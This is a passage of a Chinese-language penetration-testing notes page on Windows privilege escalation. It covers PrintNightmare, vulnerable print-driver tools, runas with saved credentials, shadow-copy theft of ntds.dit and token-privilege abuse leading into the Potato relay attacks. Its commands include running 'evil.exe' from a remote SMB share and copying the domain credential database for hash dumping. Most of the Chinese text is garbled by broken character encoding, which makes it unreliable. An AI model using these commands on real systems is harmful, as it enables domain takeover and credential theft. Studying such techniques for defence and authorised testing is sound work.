</span><span class="nv">$fullprinterName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'\\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$serverName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$printerName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">' - '</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="kr">If</span><span class="w"> </span><span class="p">([</span><span class="n">System.Environment</span><span class="p">]::</span><span class="n">Is64BitOperatingSystem</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="s1">'x64'</span><span class="p">}</span><span class="w"> </span><span class="kr">Else</span><span class="w"> </span><span class="p">{</span><span class="s1">'x86'</span><span class="p">})</span><span class="w">
</span><span class="n">Remove-Printer</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$fullprinterName</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span><span class="n">Add-Printer</span><span class="w"> </span><span class="nt">-ConnectionName</span><span class="w"> </span><span class="nv">$fullprinterName</span><span class="w">
</span></code></pre></div></div>
<h3 id="printernightmare">PrinterNightmare</h3>
<p>æ¼æ´CVEç¼–å·ï¼šCVE-2021-1675ã€‚æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´ä»¥SYSTEMæƒé™åœ¨åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œè·å¾—æ•´ä¸ªåŸŸçš„æ§åˆ¶æƒã€‚å»ºè®®å—å½±å“ç”¨æˆ·åŠæ—¶æ›´æ–°æ¼æ´è¡¥ä¸è¿›è¡Œé˜²æŠ¤ï¼Œåšå¥½èµ„äº§è‡ªæŸ¥ä»¥åŠé¢„é˜²å·¥ä½œï¼Œä»¥å…é­å—é»‘å®¢æ”»å‡»ã€‚</p>

<p><strong>å½±å“èŒƒå›´</strong></p>

<p>Windows Server 2012 R2 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 (Server Core installation)
Windows Server 2012
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows RT 8.1
Windows 8.1 for x64-based systems
Windows 8.1 for 32-bit systems
Windows 7 for x64-based Systems Service Pack 1
Windows 7 for 32-bit Systems Service Pack 1
Windows Server 2016 (Server Core installation)
Windows Server 2016
Windows 10 Version 1607 for x64-based Systems
Windows 10 Version 1607 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 for 32-bit Systems
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
Windows 10 Version 21H1 for 32-bit Systems
Windows 10 Version 21H1 for ARM64-based Systems
Windows 10 Version 21H1 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems</p>

<ul>
  <li><a href="https://github.com/cube0x0/CVE-2021-1675">cube0x0/CVE-2021-1675: C# and Impacket implementation of PrintNightmare CVE-2021-1675/CVE-2021-34527</a></li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>[ã€–EXPã€—Ladonæ‰“å°æœºæ¼æ´ææƒCVE-2021-1675å¤ç°</td>
          <td>K8å“¥å“¥â€™s Blog](https://k8gege.org/p/CVE-2021-1675.html)</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<h3 id="bring-your-own-vulnerability">Bring Your Own Vulnerability</h3>
<p>windows å…è®¸ä½æƒé™ç”¨æˆ·å®‰è£…æ‰“å°æœºé©±åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è‡ªè¡Œå®‰è£…å¸¦æœ‰æ¼æ´çš„é©±åŠ¨ç¨‹åºï¼Œç„¶åé€šè¿‡è¿™äº›é©±åŠ¨ç¨‹åºçš„æ¼æ´ææƒåˆ° SYSTEMã€‚</p>

<p>Concealed Position : https://github.com/jacob-baines/concealed_position</p>
<ul>
  <li>ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE</li>
  <li>RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE</li>
  <li>POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE</li>
  <li>SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE</li>
</ul>

<p>åˆ©ç”¨ expï¼š</p>
<ul>
  <li><a href="https://github.com/jacob-baines/concealed_position">jacob-baines/concealed_position: Bring your own print driver privilege escalation tool</a></li>
</ul>

<h2 id="åˆ©ç”¨-runas-å‘½ä»¤ææƒæˆ–é™æƒ">åˆ©ç”¨ RunAS å‘½ä»¤ææƒæˆ–é™æƒ</h2>
<p>RunAS å‘½ä»¤ä½¿ç”¨åœºæ™¯ï¼š</p>
<ol>
  <li>æƒé™ä¸å¤Ÿè¯»ä¸åˆ°å¸å¯†æˆ– HASH çš„æƒ…å†µä¸‹ï¼ŒéªŒè¯ç”¨æˆ·æ˜¯å¦ä½¿ç”¨æŸä¸ªå·²ä¿å­˜çš„å¯†ç ï¼Œä½¿ç”¨è¯¥å·²ä¿å­˜çš„å¯†ç å¯å®ç°ææƒ</li>
  <li>SYSTEM æƒé™é™æƒåˆ°æŸä¸ªç”¨æˆ·è¿›è¡Œæ“ä½œæ—¶ï¼Œä¾‹å¦‚åˆ‡æ¢åˆ°ç‰¹å®šçš„ç”¨æˆ·ï¼Œè¯»å–å¯¹åº”çš„æµè§ˆå™¨è®°å½•ã€æˆ–è€…è·å–ç‰¹å®šç”¨æˆ·çš„ shell ç­‰ã€‚</li>
</ol>

<p>æšä¸¾ä¿å­˜çš„å¯†ç ï¼š</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cmdkey</span> <span class="na">/list
</span><span class="kd">Currently</span> <span class="kd">stored</span> <span class="kd">credentials</span>:
    <span class="kd">Target</span>: <span class="kd">Domain</span><span class="nl">:interactive</span><span class="o">=</span><span class="kd">WORKGROUP</span>\Administrator
    <span class="kd">Type</span>: <span class="kd">Domain</span> <span class="kd">Password</span>
    <span class="kd">User</span>: <span class="kd">WORKGROUP</span>\Administrator
</code></pre></div></div>
<p>ä½¿ç”¨ä¿å­˜çš„å‡­è¯è¿æ¥è¿œç¨‹ SMB æˆ–è€…ç›´æ¥è¿è¡Œå‘½ä»¤ï¼š</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">runas</span> <span class="na">/savecred /user</span><span class="nl">:WORKGROUP</span>\Administrator <span class="s2">"\\10.XXX.XXX.XXX\SHARE\evil.exe"</span>
<span class="nb">runas</span> <span class="na">/savecred /user</span><span class="nl">:Administrator</span> <span class="s2">"cmd.exe /k whoami"</span>
</code></pre></div></div>

<p>å…¶ä»–åˆ©ç”¨ï¼š</p>

<ul>
  <li><a href="http://k8gege.org/Ladon/runas.html">ã€–æ•™ç¨‹ã€—Ladonéäº¤äº’å¼runasæ‰§è¡Œå‘½ä»¤/åå¼¹SHELL </a>
    <blockquote>
      <p>ç³»ç»Ÿè‡ªå¸¦Runaså‘½ä»¤éœ€è¦äº¤äº’å¼ç™»é™†ï¼Œåœ¨webshellæˆ–ä¸æ”¯æŒäº¤äº’å¼çš„shellä¸‹ä½¿ç”¨éº»çƒ¦ã€‚è€ŒLadonçš„Runasåˆ™å®Œç¾è§£å†³äº†ä»¥ä¸Šé—®é¢˜ï¼Œæ”¯æŒéäº¤äº’å¼æ¨¡æ‹Ÿç™»é™†æŒ‡å®šç”¨æˆ·è¿è¡Œç¨‹åºæˆ–å‘½ä»¤ã€‚</p>
    </blockquote>
  </li>
</ul>

<h2 id="åˆ©ç”¨-shadow-copies-ææƒåŸŸæ§">åˆ©ç”¨ Shadow Copies ææƒï¼ˆåŸŸæ§ï¼‰</h2>
<p>è¯¥åˆ©ç”¨æ–¹å¼ä¸€èˆ¬ç”¨äºä»åŸŸæ§ä¸­è·å– ntds.dit æ–‡ä»¶ï¼ˆæ´»åŠ¨ç›®å½•ä¸­çš„æ‰€æœ‰æ•°æ®éƒ½ä¿å­˜åœ¨è¯¥æ–‡ä»¶ä¸­ï¼‰ã€‚</p>

<p>è·å–å·å½±ä½ç½®ï¼š</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># List shadow copies using vssadmin (Needs Admnistrator Access)</span><span class="w">
</span><span class="n">vssadmin</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">shadows</span><span class="w">
  
</span><span class="c"># List shadow copies using diskshadow</span><span class="w">
</span><span class="n">diskshadow</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">shadows</span><span class="w"> </span><span class="nx">all</span><span class="w">

</span></code></pre></div></div>

<p>åˆ›å»ºè½¯é“¾æ¥ä»¥ä¾¿æŸ¥çœ‹ã€‚</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Make a symlink to the shadow copy and access </span><span class="w">
</span><span class="n">mklink</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="nx">c:\shadowcopy</span><span class="w"> </span><span class="nx">\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span><span class="w">
</span></code></pre></div></div>

<p>æˆ–è€…åˆ›å»ºä¸€ä¸ªå·å½±æ‹·è´ï¼Œç„¶åå¤åˆ¶å‡ºæ¥</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vssadmin</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">/for</span><span class="o">=</span><span class="n">c:</span><span class="w">
</span><span class="nx">copy</span><span class="w"> </span><span class="nx">\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit</span><span class="w"> </span><span class="nx">c:\ntds.dit</span><span class="w">
</span></code></pre></div></div>

<p>è·å–åˆ° ntds åï¼Œå¯ä»¥æƒ³åŠæ³•è·å–å…¶ä¸­çš„æ•£åˆ—å€¼ã€‚</p>
<ul>
  <li>Impacket ä¸­çš„ Secretsdump</li>
  <li>msf ä¸­çš„ Psexec_ntdsgrab æ¨¡å—</li>
  <li>msf ä¸­ Meterpreterä¼šè¯ + windows/gather/credentials/domain_hashdump</li>
</ul>

<p><strong>å‚è€ƒèµ„æ–™</strong>ï¼š</p>
<ul>
  <li><a href="https://zhuanlan.zhihu.com/p/441167567">åŸŸæ§å®‰å…¨ä¹‹åŸŸæ¸—é€ - çŸ¥ä¹</a></li>
</ul>

<h2 id="åˆ©ç”¨-psexec-ææƒwin2003--win2008">åˆ©ç”¨ PsExec ææƒ(Win2003 &amp; Win2008)</h2>
<p>PsExec æ˜¯ windows å†…æ ¸å¥—ä»¶ SysInternalSuite ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥ä» Administrator ææƒåˆ° SYSTEM</p>

<p>ä¸‹è½½åœ°å€:<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/">Sysinternals Utilities - Sysinternals | Microsoft Learn</a></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PsExec -i -s cmd
</code></pre></div></div>

<p>å‚è€ƒ</p>
<ul>
  <li><a href="https://github.com/SexyBeast233/SecBooks/blob/main/%E3%80%90%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E3%80%91bypass/%E5%AE%9E%E6%88%98%E9%81%87%E8%A7%81%E5%88%B0%E7%9A%84%E5%A5%BD%E7%94%A8%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E9%9B%86%E5%90%88.md">SecBooks/ã€å…¬ä¼—å·æ–‡ç« ã€‘bypass/å®æˆ˜é‡è§åˆ°çš„å¥½ç”¨ææƒæ–¹æ³•é›†åˆ.md at main Â· SexyBeast233/SecBooks</a></li>
</ul>

<h2 id="åˆ©ç”¨-windows-è‡ªå¸¦æ–‡ä»¶è„šæœ¬ææƒ">åˆ©ç”¨ Windows è‡ªå¸¦æ–‡ä»¶ã€è„šæœ¬ææƒ</h2>
<p>Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/</p>

<h2 id="æ»¥ç”¨-token-ææƒ">æ»¥ç”¨ Token ææƒ</h2>
<p>æ¡ä»¶ï¼š</p>
<ul>
  <li>å·²ç»æ‹¿åˆ°éç®¡ç†å‘˜æƒé™çš„æœåŠ¡å¸æˆ·</li>
</ul>

<p>æ•ˆæœï¼š</p>
<ul>
  <li>ææƒè‡³ SYSTEM</li>
</ul>

<h3 id="èƒŒæ™¯çŸ¥è¯†">èƒŒæ™¯çŸ¥è¯†</h3>

<hr />
<p>å½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸€ä¸ªè®¿é—®ä»¤ç‰Œã€‚ç”¨æˆ·æ‰§è¡Œçš„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è¯¥è®¿é—®ä»¤ç‰Œçš„å‰¯æœ¬ã€‚ä»¤ç‰Œæ ‡è¯†äº†ç”¨æˆ·ã€ç”¨æˆ·çš„ç»„ã€ç”¨æˆ·çš„æƒé™ä»¥åŠSIDï¼ˆå®‰å…¨æ ‡è¯†ç¬¦ï¼‰ã€‚</p>

<p>å½“æœ¬åœ°ç®¡ç†å‘˜ç™»å½•æ—¶ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸¤ä¸ªè®¿é—®ä»¤ç‰Œï¼šä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™ï¼Œå¦ä¸€ä¸ªå…·æœ‰æ™®é€šæƒé™ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“è¯¥ç”¨æˆ·æ‰§è¡Œè¿›ç¨‹æ—¶ï¼Œå°†ä½¿ç”¨å…·æœ‰å¸¸è§„ï¼ˆéç®¡ç†å‘˜ï¼‰æƒé™çš„è¿›ç¨‹ã€‚å½“æ­¤ç”¨æˆ·å°è¯•ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä»»ä½•æ“ä½œï¼ˆä¾‹å¦‚â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€ï¼‰æ—¶ï¼Œå°†ä½¿ç”¨ UAC æ¥è¯·æ±‚æƒé™ã€‚</p>

<p>ä½¿ç”¨ whoami /priv å¯ä»¥æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™ã€‚æ‹¥æœ‰ä¸‹é¢æƒé™æ—¶å¯è€ƒè™‘ä½¿ç”¨è¿™ç§æ–¹å¼ï¼š</p>
<ul>
  <li>iis sqlserver çš„ç”¨æˆ·é€šå¸¸å…·æœ‰ SeImpersonatePrivilege å’Œ SeAssignPrimaryPrivilege æƒé™ã€‚</li>
  <li>æœåŠ¡ç”¨æˆ·é€šå¸¸æ‹¥æœ‰ SeBackupPrivilege å’Œ SeRestorePrivilege æƒé™ã€‚</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    SeIncreaseQuotaPrivilege: DISABLED
    SeShutdownPrivilege: DISABLED
    SeAuditPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED
</code></pre></div></div>

<p><strong>ä¸åŒçš„å‡ ç§æƒé™å¯èƒ½ä¼šç”¨äºä¸åŒçš„æ”»å‡»åœºæ™¯</strong></p>

<p><strong>1. SeImpersonatePrivilege</strong>
ä»»ä½•æ‹¥æœ‰æ­¤æƒé™çš„è¿›ç¨‹éƒ½å¯ä»¥æ¨¡æ‹Ÿï¼ˆä½†ä¸èƒ½åˆ›å»ºï¼‰å®ƒèƒ½å¤Ÿå¤„ç†çš„ä»»ä½•ä»¤ç‰Œã€‚  æ‚¨å¯ä»¥ä» Windows æœåŠ¡ (DCOM) è·å–ç‰¹æƒä»¤ç‰Œï¼Œä½¿å…¶é’ˆå¯¹è¯¥æ¼æ´æ‰§è¡Œ NTLM èº«ä»½éªŒè¯ï¼Œç„¶åä»¥ SYSTEM èº«ä»½æ‰§è¡Œè¿›ç¨‹ã€‚</p>

<p>åˆ©ç”¨æ–¹æ³•ï¼š</p>
<ol>
  <li>
    <p>ä½¿ç”¨ NTLM relay åˆ°æœ¬åœ°åå•†è·å¾—ç³»ç»Ÿç”¨æˆ·çš„ tokenã€‚</p>
  </li>
  <li>
    <p>å¯ä»¥ä½¿ç”¨å¼€æºå·¥å…·çƒ‚åœŸè±†ã€å­¤ç‹¬åœŸè±†æˆ–å¤šæ±åœŸè±†ã€‚</p>
  </li>
  <li>
    <p>é€šè¿‡WinAPI CreateProcessWithTokenåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œä¼ å…¥ç³»ç»Ÿç”¨æˆ·çš„ä»¤ç‰Œã€‚</p>
  </li>
</ol>

<p>åªæœ‰å…·æœ‰SeImpersonatePrivilegeæƒé™æ‰èƒ½æˆåŠŸåˆ›å»ºã€‚</p>

<p><strong>2. SeAssignPrimaryPrivilege</strong>
å®ƒä¸ SeImpersonatePrivilege éå¸¸ç›¸ä¼¼ï¼Œå®ƒå°†ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•æ¥è·å–ç‰¹æƒä»¤ç‰Œã€‚
ç„¶åï¼Œæ­¤æƒé™å…è®¸å°†ä¸»ä»¤ç‰Œåˆ†é…ç»™æ–°çš„/æŒ‚èµ·çš„è¿›ç¨‹ã€‚<br />
ä½¿ç”¨ç‰¹æƒæ¨¡æ‹Ÿä»¤ç‰Œï¼Œæ‚¨å¯ä»¥æ´¾ç”Ÿä¸»ä»¤ç‰Œ (DuplicateTokenEx)ã€‚æœ‰äº†ä»¤ç‰Œï¼Œæ‚¨å¯ä»¥ä½¿ç”¨â€œCreateProcessAsUserâ€åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œæˆ–è€…åˆ›å»ºä¸€ä¸ªæŒ‚èµ·çš„è¿›ç¨‹å¹¶è®¾ç½®ä»¤ç‰Œï¼ˆé€šå¸¸ï¼Œæ‚¨ä¸èƒ½ä¿®æ”¹æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„ä¸»ä»¤ç‰Œï¼‰ã€‚</p>

<p>åˆ©ç”¨æ–¹æ³•ï¼š</p>
<ul>
  <li>åˆ©ç”¨ NTLM Relay åˆ°å½“åœ°è°ˆåˆ¤è·å¾—ç³»ç»Ÿç”¨æˆ·çš„ token</li>
  <li>é€šè¿‡ WinAPI CreateProcessAsUser åˆ›å»ºæ–°è¿›ç¨‹ï¼Œä¼ å…¥ç³»ç»Ÿç”¨æˆ·çš„ tokenï¼Œè¯¥ token å…·æœ‰ç³»ç»Ÿæƒé™ã€‚</li>
</ul>

<p><strong>3. SeBackupPrivilege</strong>
æ­¤æƒé™ä½¿ç³»ç»Ÿæˆäºˆå¯¹ä»»ä½•æ–‡ä»¶çš„æ‰€æœ‰è¯»å–è®¿é—®æ§åˆ¶ï¼ˆä»…é™è¯»å–ï¼‰ã€‚ä½¿ç”¨å®ƒä»æ³¨å†Œè¡¨ä¸­è¯»å–æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œç„¶åå°†â€œpsexecâ€æˆ–â€œwmicexecâ€ä¸å“ˆå¸Œå€¼ (PTH) ç»“åˆä½¿ç”¨ã€‚</p>

<p>å¦‚æœæœ¬åœ°ç®¡ç†å‘˜è¢«ç¦ç”¨ï¼Œæˆ–è€…é…ç½®ä¸ºæœ¬åœ°ç®¡ç†å‘˜åœ¨è¿œç¨‹è¿æ¥æ—¶ä¸æ˜¯ç®¡ç†å‘˜ï¼Œåˆ™æ­¤æ”»å‡»å°†ä¸èµ·ä½œç”¨ã€‚</p>

<p>æ”»å‡»åœºæ™¯ï¼šæ”¶é›†</p>

<p><strong>4. SeRestorePrivilege</strong>
å¯¹ç³»ç»Ÿä¸Šä»»ä½•æ–‡ä»¶çš„å†™å…¥è®¿é—®æ§åˆ¶ï¼Œæ— è®ºæ–‡ä»¶ ACL ä¸ºä½•ã€‚ä½ å¯ä»¥ä¿®æ”¹æœåŠ¡ã€DLLåŠ«æŒã€è®¾ç½®è°ƒè¯•å™¨ï¼ˆå›¾åƒæ–‡ä»¶æ‰§è¡Œé€‰é¡¹ï¼‰â€¦â€¦å¾ˆå¤šé€‰é¡¹å¯ä»¥å‡çº§</p>
<blockquote>
  <p>æ”»å‡»åœºæ™¯ï¼šæŒä¹…åŒ–ï¼›é˜²å¾¡è§„é¿</p>
</blockquote>

<p><strong>5. SeCreateTokenPrivilege</strong>
ä»…å½“ç”¨æˆ·å¯ä»¥æ¨¡æ‹Ÿä»¤ç‰Œï¼ˆå³ä½¿æ²¡æœ‰ SeImpersonatePrivilegeï¼‰æ—¶ï¼Œæ­¤ä»¤ç‰Œæ‰å¯ä»¥ç”¨ä½œ EoP æ–¹æ³•ã€‚
åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä»¤ç‰Œé’ˆå¯¹åŒä¸€ç”¨æˆ·å¹¶ä¸”å®Œæ•´æ€§çº§åˆ«å°äºæˆ–ç­‰äºå½“å‰è¿›ç¨‹å®Œæ•´æ€§çº§åˆ«ï¼Œåˆ™ç”¨æˆ·å¯ä»¥æ¨¡æ‹Ÿä»¤ç‰Œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿä»¤ç‰Œå¹¶å‘å…¶æ·»åŠ ç‰¹æƒç»„ SIDã€‚</p>
<blockquote>
  <p>æ”»å‡»æ–¹å¼ï¼šææƒ</p>
</blockquote>

<p><strong>6. SeLoadDriverPrivilege</strong>
åŠ è½½å’Œå¸è½½è®¾å¤‡é©±åŠ¨ç¨‹åºã€‚</p>
<blockquote>
  <p>æ”»å‡»æ–¹å¼ï¼šæŒä¹…åŒ–ï¼›é˜²å¾¡è§„é¿</p>
</blockquote>

<p><strong>7. SeTakeOwnershipPrivilege</strong>
æ­¤æƒé™ä¸ SeRestorePrivilege éå¸¸ç›¸ä¼¼ã€‚å®ƒå…è®¸è¿›ç¨‹é€šè¿‡æˆäºˆ WRITE_OWNER è®¿é—®æƒé™æ¥â€œè·å¾—å¯¹è±¡çš„æ‰€æœ‰æƒï¼Œè€Œæ— éœ€æˆäºˆä»»æ„è®¿é—®æƒé™â€ã€‚é¦–å…ˆï¼Œæ‚¨å¿…é¡»è·å¾—è¦å†™å…¥çš„æ³¨å†Œè¡¨é¡¹çš„æ‰€æœ‰æƒå¹¶ä¿®æ”¹ DACLï¼Œä»¥ä¾¿å¯ä»¥åœ¨å…¶ä¸Šå†™å…¥ã€‚</p>
<blockquote>
  <p>æ”»å‡»åœºæ™¯ï¼šæŒä¹…åŒ–ï¼›é˜²å¾¡è§„é¿ï¼›æ”¶é›†</p>
</blockquote>

<p><strong>8. SeDebugPrivilege</strong>
å®ƒå…è®¸æŒæœ‰è€…è°ƒè¯•å¦ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™åŒ…æ‹¬è¯»å–å’Œå†™å…¥è¯¥è¿›ç¨‹çš„å†…å­˜ã€‚æœ‰è®¸å¤šä¸åŒçš„å†…å­˜æ³¨å…¥ç­–ç•¥å¯ä»¥ä¸æ­¤ç‰¹æƒä¸€èµ·ä½¿ç”¨ï¼Œä»è€Œè§„é¿å¤§å¤šæ•° AV/HIPS è§£å†³æ–¹æ¡ˆã€‚</p>
<blockquote>
  <p>æ”»å‡»æ–¹å¼ï¼šå‡­æ®çªƒå–ã€ææƒã€é˜²å¾¡è§„é¿ç­‰ã€‚</p>
</blockquote>

<p><strong>9. SeTcbPrivilege</strong>
æ­¤æƒé™å°†å…¶æŒæœ‰è€…æ ‡è¯†ä¸ºå—ä¿¡ä»»è®¡ç®—æœºåº“çš„ä¸€éƒ¨åˆ†ã€‚æŸäº›å—ä¿¡ä»»çš„å—ä¿æŠ¤å­ç³»ç»Ÿè¢«æˆäºˆæ­¤ç‰¹æƒã€‚</p>

<blockquote>
  <p>æ”»å‡»åœºæ™¯ï¼šæƒé™æå‡</p>
</blockquote>

<p><strong>å‚è€ƒï¼š</strong></p>
<ul>
  <li><a href="https://www.wangan.com/p/7fy747bffedd4919">Windows TokenåŸç†åŠåˆ©ç”¨ - ç½‘å®‰</a></li>
  <li><a href="https://www.thehackerworld.com/Hacker-topic/20369.html/">æ¸—é€æŠ€å·§â€”â€”åˆ©ç”¨Windowsçš„ä¹å¤§æƒé™ - WEB and server security vulnerabilities - é»‘å®¢ä¸­æ–‡è®ºå›ç½‘ç«™</a></li>
</ul>

<hr />

<p>åŸºäº Token ææƒçš„åˆ©ç”¨å·¥å…·å°±æ˜¯å¸¸ç”¨çš„ Potato å®¶æ—äº†ï¼š</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120023623.png" alt="20231120023623" /></p>

<h3 id="origin-potatoms08-068">Origin Potato(MS08-068)</h3>
<p>Origin Potato å°±æ˜¯ NTLM-Relayï¼Œå¾®è½¯åœ¨ kb957097 è¡¥ä¸ä¸­é€šè¿‡ä¿®å¤ SMB èº«ä»½éªŒè¯ç­”å¤çš„éªŒè¯æ–¹å¼æ¥é˜²æ­¢å‡­æ®é‡æ’­ã€‚</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120071554.png" alt="20231120071554" /></p>

<p>å½“ä¸»æœº A å‘ä¸»æœº B è¿›è¡Œ SMB è®¤è¯çš„æ—¶å€™ï¼Œå°† pszTargetName è®¾ç½®ä¸º cifs/Bï¼Œç„¶ååœ¨ type2 æ‹¿åˆ° B å‘é€çš„ Challenge ä¹‹åï¼Œåœ¨ lsass é‡Œé¢ç¼“å­˜ (Challenge,cifs/B)ï¼Œæ¥ç€ B æ‹¿åˆ° A çš„ type3ï¼Œè¿™æ—¶ä¼šå»æ£€æŸ¥ lsass ç¼“å­˜é‡Œæ˜¯å¦æœ‰ (Challenge,cifs/B)ï¼Œå¦‚æœæœ‰å°±è¯´æ˜è¿™æ˜¯åŒä¸€å°ä¸»æœºï¼Œé‚£ä¹ˆè®¤è¯å¤±è´¥ã€‚</p>

<h3 id="hot-potato">Hot Potato</h3>
<p>Hot Potato æ˜¯ Potato å®¶æ—æœ€æ—©çš„åˆ©ç”¨æ–¹å¼ï¼Œå…¶æ”»å‡»åŸç†å¦‚ä¸‹ï¼š</p>
<ol>
  <li>Windows Update æœåŠ¡ä»¥ SYSTEM æƒé™è¿è¡Œï¼Œä¸”ä¼šå‘èµ· NTLM è®¤è¯ï¼Œå¦‚æœèƒ½å¤Ÿä½œä¸ºä¸­é—´äººï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿé€šè¿‡ NTLM Relay è·å–åˆ° SYSTEM æƒé™ã€‚</li>
  <li>Windows Update æœåŠ¡åœ¨è¿è¡Œæ—¶ä¼šé»˜è®¤è¯·æ±‚ http://wpad/wpad.dat è¿™ä¸ª  URL ä»¥è·å–ç½‘ç»œä»£ç†çš„é…ç½®ï¼Œä½†è¿™ä¸ªåŸŸåå¹¶ä¸æ˜¯æ‰€æœ‰ä¸»æœºéƒ½ä¼šé…ç½®ï¼Œå…¬ç½‘ä¸Šä¹Ÿæ²¡æœ‰è¿™ä¸ªåŸŸåï¼Œæ ¹æ® Windows çš„åŸŸåè§£æé¡ºåºï¼ˆhost-&gt; DNS æŸ¥è¯¢ -&gt; NBNS æŸ¥è¯¢ï¼‰ï¼Œåªè¦æ”»å‡»è€…ä¼ªé€ ä¸€ä¸ª NBNS æŸ¥è¯¢çš„å“åº”ï¼Œå°±èƒ½å¤Ÿæ§åˆ¶ Windows Update æœåŠ¡çš„ä»£ç†æŒ‡å‘è‡ªå·±ã€‚</li>
  <li>æ”»å‡»è€…ä»¥ä¸­é—´äººçš„èº«ä»½å®Œæˆ NTLM Relay ä»è€Œè·å–åˆ° System æƒé™çš„ tokenã€‚</li>
</ol>

<p>å½±å“èŒƒå›´ï¼š</p>
<ul>
  <li>Windows 7,8,10,Server 2008 ä»¥åŠ Server 2012</li>
</ul>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120023106.png" alt="20231120023106" /></p>

<p>å…¶æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
